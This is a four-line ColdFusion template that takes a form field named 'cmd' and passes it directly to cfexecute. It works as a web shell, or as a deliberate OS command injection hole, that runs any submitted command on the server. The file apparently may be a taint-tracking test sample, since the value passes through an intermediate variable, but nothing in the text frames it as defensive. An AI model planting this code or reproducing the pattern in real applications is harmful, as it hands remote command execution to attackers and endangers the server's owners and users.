<cfset selected = form.cmd>
<cfset forwarded = selected>
<cfoutput><input name="cmd"></cfoutput>
<cfexecute name="#forwarded#"></cfexecute>
